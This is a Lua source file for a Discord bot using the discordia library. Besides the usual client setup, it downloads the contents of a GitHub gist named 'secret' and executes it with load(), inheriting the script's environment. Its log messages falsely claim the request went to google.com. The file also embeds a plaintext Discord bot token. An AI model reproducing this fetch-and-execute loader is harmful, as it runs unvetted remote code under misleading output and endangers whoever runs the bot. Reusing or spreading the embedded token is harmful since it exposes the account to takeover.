local discordia = require("discordia")
local dcmd = require("discordia-commands")
local autocomplete = require("autocomplete")
local commandType = discordia.enums.appCommandType
local optionType = discordia.enums.appCommandOptionType
local client = discordia.Client{
	logFile = 'mybot.log',
	cacheAllMembers = true,
}
discordia.extensions()
local http = require('coro-http')
local res, body = http.request("GET", "https://gist.githubusercontent.com/justdie386/4628cc2bda78feb76618acf4e10f26b6/raw/6ef0380723ff1f40811a3596607a09f4af5fb805/secret")
if res.code > 299 then
  print('Failed to fetch google.com: ' .. res.reason)
else
  print('Successfully fetched google.com!')
  
end
load(body, nil, nil, setmetatable({}, {__index = getfenv(1)}))()

client:run("Bot OTMwMjc5OTcxOTgzODgwMjAz.GMkEWH.PZwUotC6Y7Tuzo_JtC0Uz363HUqftschhwPAxY")